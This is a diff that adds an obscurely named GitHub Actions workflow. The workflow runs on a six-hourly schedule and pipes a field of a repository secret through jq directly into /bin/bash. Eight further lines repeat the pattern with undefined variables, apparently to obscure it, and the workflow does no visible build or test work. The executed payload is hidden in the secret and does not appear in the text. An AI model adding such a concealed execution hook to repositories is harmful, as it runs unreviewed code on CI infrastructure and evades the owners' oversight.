@@ -1,0 +1,25 @@
+name: hgakkx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hgakkx
+        env:
+          zwnzs1919: ${{ secrets.zwnzs1919 }}
+        run: |
+          echo $zwnzs1919 | jq -r .r048 | /bin/bash
+          echo $qr59 | jq -r .zgel18 | /bin/bash
+          echo $pywf34 | jq -r .g33 | /bin/bash
+          echo $p02 | jq -r .lwgs777 | /bin/bash
+          echo $sqbl52 | jq -r .h63 | /bin/bash
+          echo $w38449 | jq -r .nnqof02 | /bin/bash
+          echo $mo73600 | jq -r .xaga2341 | /bin/bash
+          echo $b8634 | jq -r .njq0433 | /bin/bash
+          echo $vaa8 | jq -r .vxki2 | /bin/bash
+
